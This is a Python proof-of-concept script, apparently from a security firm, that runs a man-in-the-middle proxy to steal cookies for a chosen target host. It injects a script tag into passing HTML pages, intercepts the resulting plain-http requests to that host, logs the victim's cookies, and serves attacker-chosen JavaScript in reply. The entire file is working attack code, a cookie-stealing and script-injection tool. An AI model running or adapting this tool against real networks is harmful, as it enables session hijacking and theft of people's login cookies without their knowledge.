#!/usr/bin/env python
import os
import string
import argparse
from libmproxy import controller, proxy, encoding
from libmproxy.protocol.http import HTTPResponse
from netlib.odict import ODictCaseless
from libmproxy.proxy.server import ProxyServer


class CookieStealer(controller.Master):

    def __init__(self, server, commandLineArguments):
        controller.Master.__init__(self, server)
        self.options = commandLineArguments
        self.cookies = []
        self.js_code = ""

    def run(self):
        if self.options.script:
            f = open(self.options.script, 'r')
            self.js_code = f.read()
            print "[+] Loading script code from " + self.options.script

        print "[+] Listening on port: " + str(self.options.port)
        try:
            return controller.Master.run(self)
        except KeyboardInterrupt:
            self.shutdown()

    def handle_request(self, flow):
        hid = (flow.request.host, flow.request.port)
        if flow.request.host == self.options.target:
            self.collect_cookies(flow.request.headers)
            resp = HTTPResponse(
               [1, 1], 200, "",
               ODictCaseless([["Content-Type", "application/javascript"]]),
               self.js_code)
            flow.reply(resp)

        flow.reply()


    def handle_response(self, flow):
        hid = (flow.request.host, flow.request.port)

        # We only inject into html responses
        if flow.response.headers['Content-Type'] and str(flow.response.headers['Content-Type'][0]).startswith('text/html'):

            # Decoding of message body (zip/deflate) needed?
            body = flow.response.content
            if flow.response.headers['Content-Encoding']:
                body = encoding.decode(flow.response.headers['Content-Encoding'][0],flow.response.content)

            # We inject the js code directly before </head>
            injected_url = "http://" + self.options.target + self.options.path
            injected_code = "<script language=\"javascript\" type=\"text/javascript\" src=\"" + injected_url + "\"></script>"
            try:
                body = body.replace("</head>", injected_code + "</head>")
            except:
                pass

            # (Re)Encoding needed?
            if flow.response.headers['Content-Encoding']:
                body = encoding.encode(flow.response.headers['Content-Encoding'][0], body)

            flow.response.content = body

        flow.reply()

    def collect_cookies(self, headers):
        if headers["cookie"]:
            for cookie in headers["cookie"][0].split(";"):
                if cookie not in self.cookies:
                    print "[+] New Cookie: " + cookie
                    self.cookies.append(cookie)



parser = argparse.ArgumentParser()
parser.add_argument("target", help="The target host from which you want to steal ssl cookies")
parser.add_argument("--ip", help="The IP address to listen on")
parser.add_argument("--port", help="The port to run on", type=int, default=8080)
parser.add_argument("--path", help="Path that will be used in the URL of the injected request", default="/")
parser.add_argument("--script", help="Script file to load", default=None)

print "---------------------------------------------"
print "https cookie stealer PoC by Mogwai Security"
print "---------------------------------------------"

arguments = parser.parse_args()
config = proxy.ProxyConfig(port=arguments.port)
server = ProxyServer(config)
m = CookieStealer(server, arguments)
m.run()
